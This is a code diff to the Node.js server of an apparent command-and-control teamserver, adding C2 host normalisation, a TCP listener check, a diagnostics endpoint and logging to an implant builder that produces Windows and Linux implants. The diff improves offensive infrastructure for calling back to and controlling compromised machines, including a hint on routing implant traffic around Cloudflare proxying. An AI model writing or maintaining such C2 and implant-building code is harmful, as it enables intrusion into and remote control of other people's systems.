@@ -1581,9 +1581,19 @@ function parseHostFromUrlish(value) {
   return plain || '';
 }
 
+function normalizeImplantHost(raw) {
+  const s = String(raw || '').trim();
+  if (!s) return '';
+  const fromUrl = parseHostFromUrlish(s);
+  if (fromUrl) return fromUrl;
+  let h = s.replace(/^https?:\/\//i, '').split('/')[0].trim();
+  if (h.includes(':')) h = h.split(':')[0];
+  return h;
+}
+
 /** Host embedded in implants from dashboard / BUILD_C2_* */
 function resolveBuildC2Host(req) {
-  const envHost = String(process.env.BUILD_C2_HOST || process.env.PUBLIC_C2_HOST || '').trim();
+  const envHost = normalizeImplantHost(process.env.BUILD_C2_HOST || process.env.PUBLIC_C2_HOST || '');
   if (envHost) return envHost;
   const corsHost = parseHostFromUrlish((process.env.CORS_ORIGIN || '').split(',')[0]);
   if (corsHost && corsHost !== 'localhost' && corsHost !== '127.0.0.1') return corsHost;
@@ -1614,6 +1624,17 @@ function resolveBuildC2Port(settings) {
     );
   }
   return listen;
+}
+
+function getTcpListenInfo() {
+  if (!tcpServer || typeof tcpServer.address !== 'function') return null;
+  try {
+    const addr = tcpServer.address();
+    if (!addr || typeof addr !== 'object') return null;
+    return { address: addr.address, port: addr.port, family: addr.family };
+  } catch (_) {
+    return null;
+  }
 }
 
 function startTcpServer(host, portRaw) {
@@ -1694,7 +1715,10 @@ async function restartTcpServerIfNeeded(newHost, newPort) {
       }
     }
   } catch (e) {
-    console.error('[TCP] Failed to start TCP listener (Go clients will not connect):', e && e.message, e);
+    console.error('[TCP] FATAL: Implant TCP listener failed (Windows/Linux implants will NOT connect):', e && e.message, e);
+    if ((process.env.APP_ENV || 'local') === 'production') {
+      process.exitCode = 1;
+    }
   }
 })();
 
@@ -2749,6 +2773,56 @@ app.get('/api/builder/builds', requireAuth, (req, res) => {
   }
 });
 
+app.get('/api/builder/c2-diagnostics', requireAuth, (req, res) => {
+  try {
+    const settings = getAllSettings();
+    const listen = getTcpListenInfo();
+    const embedHost = resolveBuildC2Host(req);
+    const embedPort = resolveBuildC2Port(settings);
+    const httpPort = Number(process.env.PORT || 5000);
+    const rawTcpEnv = Number(process.env.TCP_PORT || 0);
+    const listenPort = getImplantListenPort(settings);
+    const builds = implantBuilder.listBuilds().slice(0, 5);
+    const recentImplants = builds
+      .filter((b) => b.tool && !['linpeas-sh', 'winpeas-bat', 'go-dcom'].includes(b.tool))
+      .map((b) => ({ id: b.id, fileName: b.fileName, host: b.host, port: b.port, createdAt: b.createdAt }));
+
+    const issues = [];
+    if (!listen) issues.push('Implant TCP server is not listening — restart Node and check [TCP] logs / port in use.');
+    if (!embedHost && (process.env.APP_ENV || 'local') !== 'local') {
+      issues.push('BUILD_C2_HOST is unset — new implants will be rejected or use wrong address.');
+    }
+    if (listen && listen.port !== embedPort) {
+      issues.push(`Listener port (${listen.port}) ≠ builder embed port (${embedPort}) — rebuild implants after fixing .env.`);
+    }
+    if (rawTcpEnv === httpPort && rawTcpEnv > 0) {
+      issues.push(`TCP_PORT (${rawTcpEnv}) equals HTTP PORT — implants listen on ${listenPort} instead. Open firewall for ${listenPort}.`);
+    }
+    if (embedHost && /cloudflare|cdn|proxy/i.test(process.env.CORS_ORIGIN || '')) {
+      issues.push('CORS domain may be HTTP-only (Cloudflare). Implants need raw TCP to BUILD_C2_HOST IP — not orange-cloud HTTP.');
+    }
+
+    res.json({
+      ok: issues.length === 0,
+      issues,
+      tcpListening: !!listen,
+      tcpListen: listen,
+      embedHost,
+      embedPort,
+      env: {
+        APP_ENV: process.env.APP_ENV,
+        BUILD_C2_HOST: process.env.BUILD_C2_HOST || null,
+        TCP_PORT: process.env.TCP_PORT || null,
+        PORT: process.env.PORT || null,
+        HTTP_PORT: httpPort,
+      },
+      recentImplants,
+    });
+  } catch (e) {
+    res.status(500).json({ error: e.message || 'Diagnostics failed' });
+  }
+});
+
 app.get('/api/builder/defaults', requireAuth, (req, res) => {
   try {
     const settings = getAllSettings();
@@ -2766,11 +2840,14 @@ app.get('/api/builder/defaults', requireAuth, (req, res) => {
       linpeasAvailable = !!resolveLinpeasSrc();
       if (!linpeasAvailable) linpeasHint = linpeasSourceHint();
     } catch (_) {}
+    const listen = getTcpListenInfo();
     res.json({
       appEnv,
       host: defaultHost,
       port: defaultPort,
       implantListenPort,
+      tcpListening: !!listen,
+      tcpListenPort: listen ? listen.port : null,
       platforms: ['windows', 'linux'],
       arches: ['amd64', '386', 'arm64'],
       signing: implantBuilder.getSigningStatus(),
@@ -2862,11 +2939,9 @@ app.post('/api/builder/generate', requireAuth, async (req, res) => {
     const isDcom = platform === 'windows' && variant === 'dcom';
     const isLinpeas = platform === 'linux' && variant === 'linpeas';
     const isWinpeas = platform === 'windows' && variant === 'winpeas';
-    const host = String(
-      body.host ||
-      resolveBuildC2Host(req) ||
-      ''
-    ).trim();
+    const host = normalizeImplantHost(
+      body.host || resolveBuildC2Host(req) || ''
+    );
     const port = Number(body.port || resolveBuildC2Port(settings));
     if (!host && !isDcom && !isLinpeas && !isWinpeas) {
       return res.status(400).json({
@@ -2880,8 +2955,9 @@ app.post('/api/builder/generate', requireAuth, async (req, res) => {
           'C2 host is 127.0.0.1 — that only works on the teamserver itself. Set BUILD_C2_HOST to your public IP/domain.',
       });
     }
+    const listen = getTcpListenInfo();
     console.log(
-      `[BUILDER] Generating ${platform}/${arch}${isDcom ? '/dcom' : ''}${isLinpeas ? '/linpeas' : ''}${isWinpeas ? '/winpeas' : ''}${host ? ` -> ${host}:${port}` : ''}`
+      `[BUILDER] Generating ${platform}/${arch}${isDcom ? '/dcom' : ''}${isLinpeas ? '/linpeas' : ''}${isWinpeas ? '/winpeas' : ''}${host ? ` -> embed ${host}:${port}` : ''}${listen ? ` (listener ${listen.address}:${listen.port})` : ' (WARNING: TCP listener not up)'}`
     );
     const meta = await implantBuilder.generateBuild({
       platform,
